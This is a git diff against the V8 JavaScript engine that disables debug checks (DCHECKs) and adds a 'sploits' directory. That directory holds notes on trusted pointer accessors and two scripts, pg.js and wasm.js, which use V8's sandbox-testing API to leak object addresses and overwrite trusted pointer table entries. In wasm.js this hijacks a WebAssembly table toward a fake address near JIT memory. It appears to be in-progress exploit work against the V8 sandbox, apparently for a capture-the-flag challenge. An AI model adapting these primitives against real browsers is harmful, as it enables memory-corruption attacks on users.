@@ -1,0 +1,982 @@
+diff --git a/BUILD.gn b/BUILD.gn
+index 9769e919aaf..684ef297d44 100644
+--- a/BUILD.gn
++++ b/BUILD.gn
+@@ -1461,14 +1461,14 @@ config("toolchain") {
+   # TODO(infra): Support v8_enable_prof on Windows.
+   # TODO(infra): Add support for compiling with simulators.
+ 
+-  if (v8_enable_debugging_features || dcheck_always_on) {
+-    defines += [ "DEBUG" ]
+-    if (v8_enable_slow_dchecks) {
+-      defines += [ "ENABLE_SLOW_DCHECKS" ]
+-    }
+-  } else {
+-    defines += [ "NDEBUG" ]
+-  }
++#  if (v8_enable_debugging_features || dcheck_always_on) {
++#    defines += [ "DEBUG" ]
++#    if (v8_enable_slow_dchecks) {
++#      defines += [ "ENABLE_SLOW_DCHECKS" ]
++#    }
++#  } else {
++#    defines += [ "NDEBUG" ]
++#  }
+ 
+   if (v8_enable_verify_csa) {
+     defines += [ "ENABLE_VERIFY_CSA" ]
+diff --git a/hello.js b/hello.js
+new file mode 100644
+index 00000000000..22658681ed4
+--- /dev/null
++++ b/hello.js
+@@ -0,0 +1,455 @@
++var Module = typeof Module != "undefined" ? Module : {};
++var ENVIRONMENT_IS_WEB = typeof window == "object";
++var ENVIRONMENT_IS_WORKER = typeof importScripts == "function";
++var ENVIRONMENT_IS_NODE = typeof process == "object" && typeof process.versions == "object" && typeof process.versions.node == "string";
++if (ENVIRONMENT_IS_NODE) {
++}
++var moduleOverrides = Object.assign({}, Module);
++var arguments_ = [];
++var thisProgram = "./this.program";
++var quit_ = (status, toThrow) => {
++    throw toThrow
++};
++var scriptDirectory = "";
++
++function locateFile(path) {
++    if (Module["locateFile"]) {
++        return Module["locateFile"](path, scriptDirectory)
++    }
++    return scriptDirectory + path
++}
++
++var readAsync, readBinary;
++if (ENVIRONMENT_IS_NODE) {
++    var fs = require("fs");
++    var nodePath = require("path");
++    scriptDirectory = __dirname + "/";
++    readBinary = filename => {
++        filename = isFileURI(filename) ? new URL(filename) : nodePath.normalize(filename);
++        var ret = fs.readFileSync(filename);
++        return ret
++    };
++    readAsync = (filename, binary = true) => {
++        filename = isFileURI(filename) ? new URL(filename) : nodePath.normalize(filename);
++        return new Promise((resolve, reject) => {
++            fs.readFile(filename, binary ? undefined : "utf8", (err, data) => {
++                if (err) reject(err); else resolve(binary ? data.buffer : data)
++            })
++        })
++    };
++    if (!Module["thisProgram"] && process.argv.length > 1) {
++        thisProgram = process.argv[1].replace(/\\/g, "/")
++    }
++    arguments_ = process.argv.slice(2);
++    if (typeof module != "undefined") {
++        module["exports"] = Module
++    }
++    process.on("uncaughtException", ex => {
++        if (ex !== "unwind" && !(ex instanceof ExitStatus) && !(ex.context instanceof ExitStatus)) {
++            throw ex
++        }
++    });
++    quit_ = (status, toThrow) => {
++        process.exitCode = status;
++        throw toThrow
++    }
++} else if (ENVIRONMENT_IS_WEB || ENVIRONMENT_IS_WORKER) {
++    if (ENVIRONMENT_IS_WORKER) {
++        scriptDirectory = self.location.href
++    } else if (typeof document != "undefined" && document.currentScript) {
++        scriptDirectory = document.currentScript.src
++    }
++    if (scriptDirectory.startsWith("blob:")) {
++        scriptDirectory = ""
++    } else {
++        scriptDirectory = scriptDirectory.substr(0, scriptDirectory.replace(/[?#].*/, "").lastIndexOf("/") + 1)
++    }
++    {
++        if (ENVIRONMENT_IS_WORKER) {
++            readBinary = url => {
++                var xhr = new XMLHttpRequest;
++                xhr.open("GET", url, false);
++                xhr.responseType = "arraybuffer";
++                xhr.send(null);
++                return new Uint8Array(xhr.response)
++            }
++        }
++        readAsync = url => {
++            if (isFileURI(url)) {
++                return new Promise((reject, resolve) => {
++                    var xhr = new XMLHttpRequest;
++                    xhr.open("GET", url, true);
++                    xhr.responseType = "arraybuffer";
++                    xhr.onload = () => {
++                        if (xhr.status == 200 || xhr.status == 0 && xhr.response) {
++                            resolve(xhr.response)
++                        }
++                        reject(xhr.status)
++                    };
++                    xhr.onerror = reject;
++                    xhr.send(null)
++                })
++            }
++            return fetch(url, {credentials: "same-origin"}).then(response => {
++                if (response.ok) {
++                    return response.arrayBuffer()
++                }
++                return Promise.reject(new Error(response.status + " : " + response.url))
++            })
++        }
++    }
++} else {
++}
++var out = Module["print"] || console.log.bind(console);
++var err = Module["printErr"] || console.error.bind(console);
++Object.assign(Module, moduleOverrides);
++moduleOverrides = null;
++if (Module["arguments"]) arguments_ = Module["arguments"];
++if (Module["thisProgram"]) thisProgram = Module["thisProgram"];
++if (Module["quit"]) quit_ = Module["quit"];
++var wasmBinary;
++if (Module["wasmBinary"]) wasmBinary = Module["wasmBinary"];
++var wasmMemory;
++var ABORT = false;
++var EXITSTATUS;
++var HEAP8, HEAPU8, HEAP16, HEAPU16, HEAP32, HEAPU32, HEAPF32, HEAPF64;
++
++function updateMemoryViews() {
++    var b = wasmMemory.buffer;
++    Module["HEAP8"] = HEAP8 = new Int8Array(b);
++    Module["HEAP16"] = HEAP16 = new Int16Array(b);
++    Module["HEAPU8"] = HEAPU8 = new Uint8Array(b);
++    Module["HEAPU16"] = HEAPU16 = new Uint16Array(b);
++    Module["HEAP32"] = HEAP32 = new Int32Array(b);
++    Module["HEAPU32"] = HEAPU32 = new Uint32Array(b);
++    Module["HEAPF32"] = HEAPF32 = new Float32Array(b);
++    Module["HEAPF64"] = HEAPF64 = new Float64Array(b)
++}
++
++var __ATPRERUN__ = [];
++var __ATINIT__ = [];
++var __ATMAIN__ = [];
++var __ATPOSTRUN__ = [];
++var runtimeInitialized = false;
++
++function preRun() {
++    if (Module["preRun"]) {
++        if (typeof Module["preRun"] == "function") Module["preRun"] = [Module["preRun"]];
++        while (Module["preRun"].length) {
++            addOnPreRun(Module["preRun"].shift())
++        }
++    }
++    callRuntimeCallbacks(__ATPRERUN__)
++}
++
++function initRuntime() {
++    runtimeInitialized = true;
++    callRuntimeCallbacks(__ATINIT__)
++}
++
++function preMain() {
++    callRuntimeCallbacks(__ATMAIN__)
++}
++
++function postRun() {
++    if (Module["postRun"]) {
++        if (typeof Module["postRun"] == "function") Module["postRun"] = [Module["postRun"]];
++        while (Module["postRun"].length) {
++            addOnPostRun(Module["postRun"].shift())
++        }
++    }
++    callRuntimeCallbacks(__ATPOSTRUN__)
++}
++
++function addOnPreRun(cb) {
++    __ATPRERUN__.unshift(cb)
++}
++
++function addOnInit(cb) {
++    __ATINIT__.unshift(cb)
++}
++
++function addOnPostRun(cb) {
++    __ATPOSTRUN__.unshift(cb)
++}
++
++var runDependencies = 0;
++var runDependencyWatcher = null;
++var dependenciesFulfilled = null;
++
++function addRunDependency(id) {
++    runDependencies++;
++    Module["monitorRunDependencies"]?.(runDependencies)
++}
++
++function removeRunDependency(id) {
++    runDependencies--;
++    Module["monitorRunDependencies"]?.(runDependencies);
++    if (runDependencies == 0) {
++        if (runDependencyWatcher !== null) {
++            clearInterval(runDependencyWatcher);
++            runDependencyWatcher = null
++        }
++        if (dependenciesFulfilled) {
++            var callback = dependenciesFulfilled;
++            dependenciesFulfilled = null;
++            callback()
++        }
++    }
++}
++
++function abort(what) {
++    Module["onAbort"]?.(what);
++    what = "Aborted(" + what + ")";
++    err(what);
++    ABORT = true;
++    EXITSTATUS = 1;
++    what += ". Build with -sASSERTIONS for more info.";
++    var e = new WebAssembly.RuntimeError(what);
++    throw e
++}
++
++var dataURIPrefix = "data:application/octet-stream;base64,";
++var isDataURI = filename => filename.startsWith(dataURIPrefix);
++var isFileURI = filename => filename.startsWith("file://");
++
++function findWasmBinary() {
++    var f = "hello.wasm";
++    if (!isDataURI(f)) {
++        return locateFile(f)
++    }
++    return f
++}
++
++var wasmBinaryFile;
++
++function getBinarySync(file) {
++    if (file == wasmBinaryFile && wasmBinary) {
++        return new Uint8Array(wasmBinary)
++    }
++    if (readBinary) {
++        return readBinary(file)
++    }
++    throw "both async and sync fetching of the wasm failed"
++}
++
++function getBinaryPromise(binaryFile) {
++    if (!wasmBinary) {
++        return readAsync(binaryFile).then(response => new Uint8Array(response), () => getBinarySync(binaryFile))
++    }
++    return Promise.resolve().then(() => getBinarySync(binaryFile))
++}
++
++function instantiateArrayBuffer(binaryFile, imports, receiver) {
++    return getBinaryPromise(binaryFile).then(binary => WebAssembly.instantiate(binary, imports)).then(receiver, reason => {
++        err(`failed to asynchronously prepare wasm: ${reason}`);
++        abort(reason)
++    })
++}
++
++function instantiateAsync(binary, binaryFile, imports, callback) {
++    if (!binary && typeof WebAssembly.instantiateStreaming == "function" && !isDataURI(binaryFile) && !isFileURI(binaryFile) && !ENVIRONMENT_IS_NODE && typeof fetch == "function") {
++        return fetch(binaryFile, {credentials: "same-origin"}).then(response => {
++            var result = WebAssembly.instantiateStreaming(response, imports);
++            return result.then(callback, function (reason) {
++                err(`wasm streaming compile failed: ${reason}`);
++                err("falling back to ArrayBuffer instantiation");
++                return instantiateArrayBuffer(binaryFile, imports, callback)
++            })
++        })
++    }
++    return instantiateArrayBuffer(binaryFile, imports, callback)
++}
++
++function getWasmImports() {
++    return {a: wasmImports}
++}
++
++function createWasm() {
++    var info = getWasmImports();
++
++    function receiveInstance(instance, module) {
++        wasmExports = instance.exports;
++        wasmMemory = wasmExports["b"];
++        updateMemoryViews();
++        addOnInit(wasmExports["c"]);
++        removeRunDependency("wasm-instantiate");
++        return wasmExports
++    }
++
++    addRunDependency("wasm-instantiate");
++
++    function receiveInstantiationResult(result) {
++        receiveInstance(result["instance"])
++    }
++
++    if (Module["instantiateWasm"]) {
++        try {
++            return Module["instantiateWasm"](info, receiveInstance)
++        } catch (e) {
++            err(`Module.instantiateWasm callback failed with error: ${e}`);
++            return false
++        }
++    }
++    if (!wasmBinaryFile) wasmBinaryFile = findWasmBinary();
++    instantiateAsync(wasmBinary, wasmBinaryFile, info, receiveInstantiationResult);
++    return {}
++}
++
++function ExitStatus(status) {
++    this.name = "ExitStatus";
++    this.message = `Program terminated with exit(${status})`;
++    this.status = status
++}
++
++var callRuntimeCallbacks = callbacks => {
++    while (callbacks.length > 0) {
++        callbacks.shift()(Module)
++    }
++};
++var noExitRuntime = Module["noExitRuntime"] || true;
++var printCharBuffers = [null, [], []];
++var UTF8Decoder = typeof TextDecoder != "undefined" ? new TextDecoder : undefined;
++var UTF8ArrayToString = (heapOrArray, idx, maxBytesToRead) => {
++    var endIdx = idx + maxBytesToRead;
++    var endPtr = idx;
++    while (heapOrArray[endPtr] && !(endPtr >= endIdx)) ++endPtr;
++    if (endPtr - idx > 16 && heapOrArray.buffer && UTF8Decoder) {
++        return UTF8Decoder.decode(heapOrArray.subarray(idx, endPtr))
++    }
++    var str = "";
++    while (idx < endPtr) {
++        var u0 = heapOrArray[idx++];
++        if (!(u0 & 128)) {
++            str += String.fromCharCode(u0);
++            continue
++        }
++        var u1 = heapOrArray[idx++] & 63;
++        if ((u0 & 224) == 192) {
++            str += String.fromCharCode((u0 & 31) << 6 | u1);
++            continue
++        }
++        var u2 = heapOrArray[idx++] & 63;
++        if ((u0 & 240) == 224) {
++            u0 = (u0 & 15) << 12 | u1 << 6 | u2
++        } else {
++            u0 = (u0 & 7) << 18 | u1 << 12 | u2 << 6 | heapOrArray[idx++] & 63
++        }
++        if (u0 < 65536) {
++            str += String.fromCharCode(u0)
++        } else {
++            var ch = u0 - 65536;
++            str += String.fromCharCode(55296 | ch >> 10, 56320 | ch & 1023)
++        }
++    }
++    return str
++};
++var printChar = (stream, curr) => {
++    var buffer = printCharBuffers[stream];
++    if (curr === 0 || curr === 10) {
++        (stream === 1 ? out : err)(UTF8ArrayToString(buffer, 0));
++        buffer.length = 0
++    } else {
++        buffer.push(curr)
++    }
++};
++var _fd_write = (fd, iov, iovcnt, pnum) => {
++    var num = 0;
++    for (var i = 0; i < iovcnt; i++) {
++        var ptr = HEAPU32[iov >> 2];
++        var len = HEAPU32[iov + 4 >> 2];
++        iov += 8;
++        for (var j = 0; j < len; j++) {
++            printChar(fd, HEAPU8[ptr + j])
++        }
++        num += len
++    }
++    HEAPU32[pnum >> 2] = num;
++    return 0
++};
++var runtimeKeepaliveCounter = 0;
++var keepRuntimeAlive = () => noExitRuntime || runtimeKeepaliveCounter > 0;
++var _proc_exit = code => {
++    EXITSTATUS = code;
++    if (!keepRuntimeAlive()) {
++        Module["onExit"]?.(code);
++        ABORT = true
++    }
++    quit_(code, new ExitStatus(code))
++};
++var exitJS = (status, implicit) => {
++    EXITSTATUS = status;
++    _proc_exit(status)
++};
++var handleException = e => {
++    if (e instanceof ExitStatus || e == "unwind") {
++        return EXITSTATUS
++    }
++    quit_(1, e)
++};
++var wasmImports = {a: _fd_write};
++var wasmExports = createWasm();
++var ___wasm_call_ctors = () => (___wasm_call_ctors = wasmExports["c"])();
++var _main = Module["_main"] = (a0, a1) => (_main = Module["_main"] = wasmExports["d"])(a0, a1);
++var calledRun;
++dependenciesFulfilled = function runCaller() {
++    if (!calledRun) run();
++    if (!calledRun) dependenciesFulfilled = runCaller
++};
++
++function callMain() {
++    var entryFunction = _main;
++    var argc = 0;
++    var argv = 0;
++    try {
++        var ret = entryFunction(argc, argv);
++        exitJS(ret, true);
++        return ret
++    } catch (e) {
++        return handleException(e)
++    }
++}
++
++function run() {
++    if (runDependencies > 0) {
++        return
++    }
++    preRun();
++    if (runDependencies > 0) {
++        return
++    }
++
++    function doRun() {
++        if (calledRun) return;
++        calledRun = true;
++        Module["calledRun"] = true;
++        if (ABORT) return;
++        initRuntime();
++        preMain();
++        Module["onRuntimeInitialized"]?.();
++        if (shouldRunNow) callMain();
++        postRun()
++    }
++
++    if (Module["setStatus"]) {
++        Module["setStatus"]("Running...");
++        setTimeout(function () {
++            setTimeout(function () {
++                Module["setStatus"]("")
++            }, 1);
++            doRun()
++        }, 1)
++    } else {
++        doRun()
++    }
++}
++
++if (Module["preInit"]) {
++    if (typeof Module["preInit"] == "function") Module["preInit"] = [Module["preInit"]];
++    while (Module["preInit"].length > 0) {
++        Module["preInit"].pop()()
++    }
++}
++var shouldRunNow = true;
++if (Module["noInitialRun"]) shouldRunNow = false;
++run();
+diff --git a/sploits/notes.txt b/sploits/notes.txt
+new file mode 100644
+index 00000000000..1ade93f20db
+--- /dev/null
++++ b/sploits/notes.txt
+@@ -0,0 +1,41 @@
++
++all accessors
++
++TRUSTED_POINTER_ACCESSORS(BytecodeWrapper, bytecode, BytecodeArray,
++                          kBytecodeOffset, kBytecodeArrayIndirectPointerTag)
++
++TRUSTED_POINTER_ACCESSORS(DebugInfo, debug_bytecode_array, BytecodeArray,
++                          kDebugBytecodeArrayOffset,
++                          kBytecodeArrayIndirectPointerTag)
++TRUSTED_POINTER_ACCESSORS(DebugInfo, original_bytecode_array, BytecodeArray,
++                          kOriginalBytecodeArrayOffset,
++                          kBytecodeArrayIndirectPointerTag)
++
++TRUSTED_POINTER_ACCESSORS(WasmGlobalObject, trusted_data,
++                          WasmTrustedInstanceData, kTrustedDataOffset,
++                          kWasmTrustedInstanceDataIndirectPointerTag)
++
++
++TRUSTED_POINTER_ACCESSORS(WasmInstanceObject, trusted_data,
++                          WasmTrustedInstanceData, kTrustedDataOffset,
++                          kWasmTrustedInstanceDataIndirectPointerTag)
++
++TRUSTED_POINTER_ACCESSORS(WasmFuncRef, internal, WasmInternalFunction,
++                          kTrustedInternalOffset,
++                          kWasmInternalFunctionIndirectPointerTag)
++
++TRUSTED_POINTER_ACCESSORS(WasmTableObject, trusted_data,
++                          WasmTrustedInstanceData, kTrustedDataOffset,
++                          kWasmTrustedInstanceDataIndirectPointerTag)
++
++TRUSTED_POINTER_ACCESSORS(WasmTagObject, trusted_data, WasmTrustedInstanceData,
++                          kTrustedDataOffset,
++                          kWasmTrustedInstanceDataIndirectPointerTag)
++
++
++
++before finishing task
++learn how to compile wasm from wat/wabt?
++compile statically v8
++remove dchecks completely
++
+diff --git a/sploits/pg.js b/sploits/pg.js
+new file mode 100644
+index 00000000000..586dca8130e
+--- /dev/null
++++ b/sploits/pg.js
+@@ -0,0 +1,81 @@
++var sbxMemView = new Sandbox.MemoryView(0, 0xfffffff8);
++var dv = new DataView(sbxMemView);
++var addrOf = (o) => Sandbox.getAddressOf(o);
++
++var readHeap4 = (offset) => dv.getUint32(offset, true);
++var readHeap8 = (offset) => dv.getBigUint64(offset, true);
++var writeHeap1 = (offset, value) => dv.setUint8(offset, value, true);
++var writeHeap4 = (offset, value) => dv.setUint32(offset, value, true);
++var writeHeap8 = (offset, value) => dv.setBigUint64(offset, value, true);
++
++// console.log("H32BinaryAddress " +Sandbox.H32BinaryAddress.toString(16));
++
++var kCodeOffset = 12
++var kSharedFunctionInfoOffset = kCodeOffset + 4
++var kSelfIndirectPointerOffset = 4
++var kTrustedFunctionDataOffset = 4
++
++var kBytecodeArrayIndirectPointerTag = 2
++var kWasmTrustedInstanceDataIndirectPointerTag = 4
++
++
++
++// var raw = new Uint8Array([0x0, 0x61, 0x73, 0x6d, 0x1, 0x0, 0x0, 0x0, 0x1, 0x12, 0x3, 0x60, 0x4, 0x7f, 0x7f, 0x7f, 0x7f, 0x1, 0x7f, 0x60, 0x0, 0x0, 0x60, 0x2, 0x7f, 0x7f, 0x1, 0x7f, 0x2, 0x7, 0x1, 0x1, 0x61, 0x1, 0x61, 0x0, 0x0, 0x3, 0x3, 0x2, 0x1, 0x2, 0x4, 0x5, 0x1, 0x70, 0x1, 0x1, 0x1, 0x5, 0x6, 0x1, 0x1, 0x82, 0x2, 0x82, 0x2, 0x6, 0x8, 0x1, 0x7f, 0x1, 0x41, 0x90, 0x88, 0x4, 0xb, 0x7, 0x11, 0x4, 0x1, 0x62, 0x2, 0x0, 0x1, 0x63, 0x0, 0x1, 0x1, 0x64, 0x0, 0x2, 0x1, 0x65, 0x1, 0x0, 0xa, 0x4b, 0x2, 0x2, 0x0, 0xb, 0x46, 0x0, 0x23, 0x0, 0x41, 0x10, 0x6b, 0x22, 0x0, 0x24, 0x0, 0x20, 0x0, 0x41, 0x4, 0x36, 0x2, 0xc, 0x20, 0x0, 0x41, 0x80, 0x8, 0x36, 0x2, 0x8, 0x41, 0x1, 0x20, 0x0, 0x41, 0x8, 0x6a, 0x41, 0x1, 0x20, 0x0, 0x41, 0x4, 0x6a, 0x10, 0x0, 0x22, 0x1, 0x4, 0x40, 0x41, 0x88, 0x8, 0x20, 0x1, 0x36, 0x2, 0x0, 0xb, 0x20, 0x0, 0x28, 0x2, 0x4, 0x1a, 0x20, 0x0, 0x41, 0x10, 0x6a, 0x24, 0x0, 0x41, 0x0, 0xb, 0xb, 0xb, 0x1, 0x0, 0x41, 0x80, 0x8, 0xb, 0x4, 0x71, 0x77, 0x65, 0xa]);
++// var mod = new WebAssembly.Module(raw);
++// var imports = {a:{a: () => {console.log("qwe<<<<");},},}
++// var wasmInstance = new WebAssembly.Instance(mod, imports);
++// var wasmExports = wasmInstance.exports;
++// var init = wasmExports["c"];
++// var main = wasmExports["d"];
++
++func = () => 7*7
++func()
++// var code = readHeap4(addrOf(a) + kCodeOffset)
++var shared = readHeap4(addrOf(func) + kSharedFunctionInfoOffset)
++var trusted_data_slot_handle = readHeap4(shared-1+kTrustedFunctionDataOffset)
++console.log("[ heap        ] func.shared             " +shared.toString(16));
++console.log("[ t-p-handle  ] trusted_data_slot_handle           " +trusted_data_slot_handle.toString(16));
++
++%DebugPrint(func)
++
++Sandbox.modifyTrustedPointerTable(trusted_data_slot_handle, 0xcafe000, kBytecodeArrayIndirectPointerTag)
++
++
++// var wasmInstanceSelfIndirectHandle = readHeap4(addrOf(wasmInstance) + kSelfIndirectPointerOffset);
++// console.log("[ t-p-handle ] wasm self indirect handle " + wasmInstanceSelfIndirectHandle.toString(16));
++// // writeHeap4(shared-1+kTrustedFunctionDataOffset, wasmInstanceSelfIndirectHandle-1)
++// // Sandbox.modifyTrustedPointerTable(handle, pointer, tag) -> Bool
++// Sandbox.modifyTrustedPointerTable(wasmInstanceSelfIndirectHandle, 0xcafe000, kWasmTrustedInstanceDataIndirectPointerTag)
++// main()
++
++
++
++// func()
++
++console.log('qwe ')
++
++
++
++
++
++
++
++
++
++
++
++
++// %PrepareFunctionForOptimization(a);
++// a();
++// %OptimizeFunctionOnNextCall(a);
++// a();
++
++// %DebugPrint(a)
++
++
++
++// Sandbox.modifyTrustedPointerTable(1<<9, 0xcafe, 1)
++// Sandbox.modifyTrustedPointerTable(0x20c601, 0xcafe, 1)
++
++
++// https://ju256.rip/posts/kitctfctf22-date/
+diff --git a/sploits/wasm.js b/sploits/wasm.js
+new file mode 100644
+index 00000000000..d8dd99f3c60
+--- /dev/null
++++ b/sploits/wasm.js
+@@ -0,0 +1,72 @@
++var sbxMemView = new Sandbox.MemoryView(0, 0xfffffff8);
++var dv = new DataView(sbxMemView);
++var addrOf = (o) => Sandbox.getAddressOf(o);
++
++var readHeap4 = (offset) => dv.getUint32(offset, true);
++var readHeap8 = (offset) => dv.getBigUint64(offset, true);
++var writeHeap1 = (offset, value) => dv.setUint8(offset, value, true);
++var writeHeap4 = (offset, value) => dv.setUint32(offset, value, true);
++var writeHeap8 = (offset, value) => dv.setBigUint64(offset, value, true);
++
++// console.log("H32BinaryAddress " +Sandbox.H32BinaryAddress.toString(16));
++
++var kCodeOffset = 12
++var kSharedFunctionInfoOffset = kCodeOffset + 4
++var kSelfIndirectPointerOffset = 4
++var kTrustedFunctionDataOffset = 4
++
++var kBytecodeArrayIndirectPointerTag = 2
++var kWasmTrustedInstanceDataIndirectPointerTag = 4
++var kWasmFunctionDataIndirectPointerTag = 7
++
++
++
++var kWasmTableTrustedDataOffset = 0x24
++
++
++var raw = new Uint8Array([0x0, 0x61, 0x73, 0x6d, 0x1, 0x0, 0x0, 0x0, 0x1, 0x12, 0x3, 0x60, 0x4, 0x7f, 0x7f, 0x7f, 0x7f, 0x1, 0x7f, 0x60, 0x0, 0x0, 0x60, 0x2, 0x7f, 0x7f, 0x1, 0x7f, 0x2, 0x7, 0x1, 0x1, 0x61, 0x1, 0x61, 0x0, 0x0, 0x3, 0x3, 0x2, 0x1, 0x2, 0x4, 0x5, 0x1, 0x70, 0x1, 0x1, 0x1, 0x5, 0x6, 0x1, 0x1, 0x82, 0x2, 0x82, 0x2, 0x6, 0x8, 0x1, 0x7f, 0x1, 0x41, 0x90, 0x88, 0x4, 0xb, 0x7, 0x11, 0x4, 0x1, 0x62, 0x2, 0x0, 0x1, 0x63, 0x0, 0x1, 0x1, 0x64, 0x0, 0x2, 0x1, 0x65, 0x1, 0x0, 0xa, 0x4b, 0x2, 0x2, 0x0, 0xb, 0x46, 0x0, 0x23, 0x0, 0x41, 0x10, 0x6b, 0x22, 0x0, 0x24, 0x0, 0x20, 0x0, 0x41, 0x4, 0x36, 0x2, 0xc, 0x20, 0x0, 0x41, 0x80, 0x8, 0x36, 0x2, 0x8, 0x41, 0x1, 0x20, 0x0, 0x41, 0x8, 0x6a, 0x41, 0x1, 0x20, 0x0, 0x41, 0x4, 0x6a, 0x10, 0x0, 0x22, 0x1, 0x4, 0x40, 0x41, 0x88, 0x8, 0x20, 0x1, 0x36, 0x2, 0x0, 0xb, 0x20, 0x0, 0x28, 0x2, 0x4, 0x1a, 0x20, 0x0, 0x41, 0x10, 0x6a, 0x24, 0x0, 0x41, 0x0, 0xb, 0xb, 0xb, 0x1, 0x0, 0x41, 0x80, 0x8, 0xb, 0x4, 0x71, 0x77, 0x65, 0xa]);
++var mod = new WebAssembly.Module(raw);
++var imports = {a:{a: () => {console.log("qwe<<<<");},},}
++var wasmInstance = new WebAssembly.Instance(mod, imports);
++
++
++
++// var wasmInstanceSelfIndirectHandle = readHeap4(addrOf(wasmInstance) + kTrustedDataOffset);
++// console.log("[ t-p-handle ] wasm self indirect handle " + wasmInstanceSelfIndirectHandle.toString(16));
++
++
++
++// writeHeap4(shared-1+kTrustedFunctionDataOffset, wasmInstanceSelfIndirectHandle-1)
++// Sandbox.modifyTrustedPointerTable(handle, pointer, tag) -> Bool
++// Sandbox.modifyTrustedPointerTable(wasmInstanceSelfIndirectHandle, 0xcafe000, kWasmTrustedInstanceDataIndirectPointerTag)
++
++
++var wasmExports = wasmInstance.exports;
++var mem = wasmExports["b"];
++var init = wasmExports["c"];
++var main = wasmExports["d"];
++var table = wasmExports["e"];
++console.log(table)
++
++var table_trusted_handle = readHeap4(addrOf(table) + kWasmTableTrustedDataOffset);
++console.log("table_trusted_handle " + table_trusted_handle.toString(16))
++// Sandbox.modifyTrustedPointerTable(0x404600, 0xcafe000, kWasmFunctionDataIndirectPointerTag)
++
++
++
++// main()
++
++// var jit = 0x5555b7a40000
++var jit = 0x7fff60000000
++
++
++var fake =jit + 0x41000
++console.log("fake " + fake.toString(16))
++
++Sandbox.modifyTrustedPointerTable(table_trusted_handle, fake, kWasmTrustedInstanceDataIndirectPointerTag)
++
++table.set(0, 0x41414141)
++
++main()
++
++
+diff --git a/src/base/logging.cc b/src/base/logging.cc
+index 54aa99f02d7..5c6ce27e073 100644
+--- a/src/base/logging.cc
++++ b/src/base/logging.cc
+@@ -216,13 +216,13 @@ void V8_Fatal(const char* format, ...) {
+ }
+ 
+ void V8_Dcheck(const char* file, int line, const char* message) {
+-  if (v8::base::DcheckFailuresAreIgnored()) {
++//  if (v8::base::DcheckFailuresAreIgnored()) {
+     // In this mode, DCHECK failures don't lead to process termination.
+     v8::base::OS::PrintError(
+         "# Ignoring debug check failure in %s, line %d: %s\n", file, line,
+         message);
+     return;
+-  }
++//  }
+ 
+-  v8::base::g_dcheck_function(file, line, message);
++//  v8::base::g_dcheck_function(file, line, message);
+ }
+diff --git a/src/base/logging.h b/src/base/logging.h
+index 9f6d1b8e43f..0288e67807e 100644
+--- a/src/base/logging.h
++++ b/src/base/logging.h
+@@ -120,49 +120,49 @@ enum class OOMType {
+   } while (false)
+ #define CHECK(condition) CHECK_WITH_MSG(condition, #condition)
+ 
+-#ifdef DEBUG
+-
+-#define DCHECK_WITH_MSG_AND_LOC(condition, message, loc)                \
+-  do {                                                                  \
+-    if (V8_UNLIKELY(!(condition))) {                                    \
+-      V8_Dcheck(loc.FileName(), static_cast<int>(loc.Line()), message); \
+-    }                                                                   \
+-  } while (false)
+-#define DCHECK_WITH_MSG(condition, message)   \
+-  do {                                        \
+-    if (V8_UNLIKELY(!(condition))) {          \
+-      V8_Dcheck(__FILE__, __LINE__, message); \
+-    }                                         \
+-  } while (false)
+-#define DCHECK_WITH_LOC(condition, loc) \
+-  DCHECK_WITH_MSG_AND_LOC(condition, #condition, loc)
+-#define DCHECK(condition) DCHECK_WITH_MSG(condition, #condition)
+-
+-// Helper macro for binary operators.
+-// Don't use this macro directly in your code, use CHECK_EQ et al below.
+-#define CHECK_OP(name, op, lhs, rhs)                                      \
+-  do {                                                                    \
+-    if (std::string* _msg = ::v8::base::Check##name##Impl<                \
+-            typename ::v8::base::pass_value_or_ref<decltype(lhs)>::type,  \
+-            typename ::v8::base::pass_value_or_ref<decltype(rhs)>::type>( \
+-            (lhs), (rhs), #lhs " " #op " " #rhs)) {                       \
+-      FATAL("Check failed: %s.", _msg->c_str());                          \
+-      delete _msg;                                                        \
+-    }                                                                     \
+-  } while (false)
+-
+-#define DCHECK_OP(name, op, lhs, rhs)                                     \
+-  do {                                                                    \
+-    if (std::string* _msg = ::v8::base::Check##name##Impl<                \
+-            typename ::v8::base::pass_value_or_ref<decltype(lhs)>::type,  \
+-            typename ::v8::base::pass_value_or_ref<decltype(rhs)>::type>( \
+-            (lhs), (rhs), #lhs " " #op " " #rhs)) {                       \
+-      V8_Dcheck(__FILE__, __LINE__, _msg->c_str());                       \
+-      delete _msg;                                                        \
+-    }                                                                     \
+-  } while (false)
+-
+-#else
++//#ifdef DEBUG
++//
++//#define DCHECK_WITH_MSG_AND_LOC(condition, message, loc)                \
++//  do {                                                                  \
++//    if (V8_UNLIKELY(!(condition))) {                                    \
++//      V8_Dcheck(loc.FileName(), static_cast<int>(loc.Line()), message); \
++//    }                                                                   \
++//  } while (false)
++//#define DCHECK_WITH_MSG(condition, message)   \
++//  do {                                        \
++//    if (V8_UNLIKELY(!(condition))) {          \
++//      V8_Dcheck(__FILE__, __LINE__, message); \
++//    }                                         \
++//  } while (false)
++//#define DCHECK_WITH_LOC(condition, loc) \
++//  DCHECK_WITH_MSG_AND_LOC(condition, #condition, loc)
++//#define DCHECK(condition) DCHECK_WITH_MSG(condition, #condition)
++//
++//// Helper macro for binary operators.
++//// Don't use this macro directly in your code, use CHECK_EQ et al below.
++//#define CHECK_OP(name, op, lhs, rhs)                                      \
++//  do {                                                                    \
++//    if (std::string* _msg = ::v8::base::Check##name##Impl<                \
++//            typename ::v8::base::pass_value_or_ref<decltype(lhs)>::type,  \
++//            typename ::v8::base::pass_value_or_ref<decltype(rhs)>::type>( \
++//            (lhs), (rhs), #lhs " " #op " " #rhs)) {                       \
++//      FATAL("Check failed: %s.", _msg->c_str());                          \
++//      delete _msg;                                                        \
++//    }                                                                     \
++//  } while (false)
++//
++//#define DCHECK_OP(name, op, lhs, rhs)                                     \
++//  do {                                                                    \
++//    if (std::string* _msg = ::v8::base::Check##name##Impl<                \
++//            typename ::v8::base::pass_value_or_ref<decltype(lhs)>::type,  \
++//            typename ::v8::base::pass_value_or_ref<decltype(rhs)>::type>( \
++//            (lhs), (rhs), #lhs " " #op " " #rhs)) {                       \
++//      V8_Dcheck(__FILE__, __LINE__, _msg->c_str());                       \
++//      delete _msg;                                                        \
++//    }                                                                     \
++//  } while (false)
++//
++//#else
+ 
+ // Make all CHECK functions discard their log strings to reduce code
+ // bloat for official release builds.
+@@ -177,8 +177,8 @@ enum class OOMType {
+   } while (false)
+ 
+ #define DCHECK_WITH_MSG(condition, msg) void(0);
+-
+-#endif
++//
++//#endif
+ 
+ namespace detail {
+ template <typename... Ts>
